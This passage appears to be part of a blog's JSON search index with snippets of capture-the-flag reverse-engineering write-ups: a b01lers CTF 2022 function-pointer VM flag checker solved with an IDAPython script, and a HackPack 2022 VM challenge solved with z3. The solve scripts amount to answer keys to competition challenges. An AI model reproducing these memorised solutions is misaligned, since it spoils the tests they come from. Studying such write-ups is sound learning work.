0x74, 0xe2, 0x47, 0x19, 0xdd, 0x3b, 0xcc, 0xe8, 0x95, 0x72, 0xdd, 0xad, 0x49, 0xac, 0x8c, 0x93, 0xf1, 0x22, 0xaa, 0x61, 0xad, 0xa3, 0xf3, 0xcb, 0x8a, 0xa1, 0x28, 0x8b, 0xab, 0x33, 0x95, 0x71, 0x69, 0xfd, 0x04, 0xc4, 0x82, 0xa7, 0x97, 0x55, 0x6f, 0xf0, 0x67, 0xcc, 0xb2, 0xb0, 0x31, 0xb6, 0x4c, 0x9b, 0x03, 0xe5, 0x86, 0x14, 0x20, 0x15, 0xd5, 0xbf, 0xa6, 0xa1, 0x19, 0x4b, 0x0c, 0xb9, 0x39, 0x83, 0x2c, 0x26, 0x09, 0xf3, 0x18, 0x4f, 0x18}; dwLength = 0x66; if (!CryptDecrypt(hSessionKey, 0, TRUE, 0, cmd2, &amp;amp;dwLength)) return 1; puts(cmd2); return 0;}" }, { "title": "(CTF) b01lers CTF 2022", "url": "/posts/(ctf)-b01lers-ctf-956e6a26f4ae423a961e8c221f11b5a2/", "categories": "CTF", "tags": "writeup", "date": "2022-04-25 18:41:23 +0900", "snippet": "difficulty: 🩸rank: 70writeup: rev(1)TM ( 🩸 247 pt, 45 solve )TL;DR : simple function poiner vm__int64 __fastcall main(__int64 a1, char **a2, char **a3){ int ReturnValue; // [rsp+4h] [rbp-1Ch] int i; // [rsp+8h] [rbp-18h] __int32 *Heap; // [rsp+10h] [rbp-10h] __int32 *NextFunc; // [rsp+18h] [rbp-8h] setup(); ptr = malloc(0x100uLL); ptrPointer = ptr; memset(ptr, 0, 0x100uLL); buf = malloc(0x100uLL); bufPointer = buf; *(bufPointer + read(0, buf, 0x100uLL)) = 0; Heap = *HeapArray; ReturnValue = 1; while ( ReturnValue ) { NextFunc = HeapArray[Heap[*ptrPointer + 0x200]]; ReturnValue = (*&amp;amp;Heap[2 * *ptrPointer])(); Heap = NextFunc; } for ( i = 0; i &amp;lt;= 99; ++i ) free(HeapArray[i]); free(ptr); free(buf); free(HeapArray); return 0LL;}Just dropping the tm file to ida, see the pseudo-codesetup()HeapArray = (__int64 *)malloc((size_t)&amp;amp;MEMORY[0x4B000]); memset(HeapArray, 0, (size_t)&amp;amp;MEMORY[0x4B000]); v56 = malloc(0xC00uLL); for ( i = 0; i &amp;lt;= 255; ++i ) v56[i] = ret_1; for ( j = 0; j &amp;lt;= 255; ++j ) *((_DWORD *)v56 + j + 512) = 1; *HeapArray = (__int64)v56; v57 = malloc(0xC00uLL); for ( k = 0; k &amp;lt;= 255; ++k ) v57[k] = buf_to_ptr; for ( m = 0; m &amp;lt;= 255; ++m ) *((_DWORD *)v57 + m + 512) = 2; HeapArray[1] = (__int64)v57;It setup the HeapArray ( function pointer and some nums )# HeapArray 0 # +0 (void*) return 1 func * 0x100# +0x200 (int) 1 * 0x100# HeapArray 1# +0 (void*) *ptrPointer = *buf; buf = buf+1; func * 0x100# +0x200 (int) 2 * 0x100# HeapArray 2 # +0 (void*) return 1 func * 0x80 (odd index) / (void*) *ptrPointer+=10 * 0x80 (even index)# +0x200 (int) 4 *1# +0x204 (int) 3 * 0x100-1# HeapArray 3 # +0 (void*) *ptrPointer^=0x45, ptrPointer+=1 *0x100# +0x200 (int) 1 * 0x100# HeapArray 4 # +0 (void*) ptrPointer-=2 * 0x100# +0x200 (int) 7 * 0x100# HeapArray 5 # +0 (void*) print rejected * 0x100# HeapArray 6# +0 (void*) print accepted * 0x100# HeapArray 7 ~ 27# +0 (void*) --ptrPointer * 0x100# +0x200 ~ 0x300 = 5# +0x2XX = 0x8 ~ 0x1bHeapArray like this.Heap = (__int32 *)*HeapArray;ReturnValue = 1;while ( ReturnValue ) { v7 = (__int32 *)HeapArray[Heap[*(char *)ptrPointer + 0x200]]; ReturnValue = (*(__int64 (**)(void))&amp;amp;Heap[2 * *(char *)ptrPointer])(); Heap = v7; }and execution routine is like this. get number in HeapArray[Heap[0x200+*ptrPointer]] call the function in Heap[2 * *ptrPointer] update Heap to nextthe number array is the idx of the next HeapArray0. goto 11. get my one input byte to ptr, goto 22. *ptr is odd -&amp;gt; *ptr-=10 even -&amp;gt; return 1, goto 3 if *ptr == 0, goto 43. xor *ptr with 0x45, ptr++, goto 14. ptrPointer-=2, goto 75. print rejected6. print accepted &amp;lt;-- goal7. if *ptr == XX,ptr-=1,goto 7+1 or 58. if *ptr == XX,ptr-=1,goto 8+1 or 5...27. if *Ptr == XX, ptr-=1, goto 6 &amp;lt;-- all correct flagTo find the correct XX, I used IDApython.parse all index ( 0x276, 0x23D .. ), repeat xor and minus 10 if even number.solve.pystart=0x555555555704f=ida_funcs.get_func(start)c=7flag=&#39;&#39;for ea in Heads(f.start_ea,f.end_ea): if get_operand_value(ea,1)==0x555555555342: to=get_operand_value(ea+0x32,1) idx=get_operand_value(ea+0x4a,0) value=get_operand_value(ea+0x4a,1) print(f&quot;{c}: default : {to}, {(idx//4)-0x200}={value}&quot;) c+=1 if ((idx//4-0x200)^0x45) &amp;amp; 1 == 0: flag+=chr(((idx//4-0x200)^0x45)-10) else: flag+=chr(((idx//4-0x200)^0x45))print(flag[::-1])If you find the routine well. It was an easy problem" }, { "title": "(CTF) HackPack 2022 writeup", "url": "/posts/(ctf)-hack-d6d50/", "categories": "CTF", "tags": "writeup", "date": "2022-04-18 21:08:02 +0900", "snippet": "difficulty: 🩸🩸rank: 18writeup: rev(1)Shiftycode ( 🩸🩸 481 pt, 11 solve )TL;DR : simple vmThe vmcode file bin and binary shiftycode are given,Seeing the decompile code, It read the vm codes from the filename in command line argument.And execute the vm codeshttps://github.com/snwox/ctf-writeup/blob/master/2022/HackPack/Shiftycode/get_vmcode.pyI copied the part that runs the vm code in decompiled code,and I changed the C code to Python little by littleon the 108th, 117th line, those are Condition Statement which exit when I input wrong FLAG in arBut if I annotate the above two lines, I can see the full opcodes.ar[0]~ar[26] is user inputI input correct flag in ar, so the flags will be always False.So all the Condition Statement can be passedAnnotating the two Condition Statement,I can see all the Flag comparing opcode and Condition.Input all the conditions in z3, I can get the flaghttps://github.com/snwox/ctf-writeup/blob/master/2022/HackPack/Shiftycode/z3-solve.py" } ]
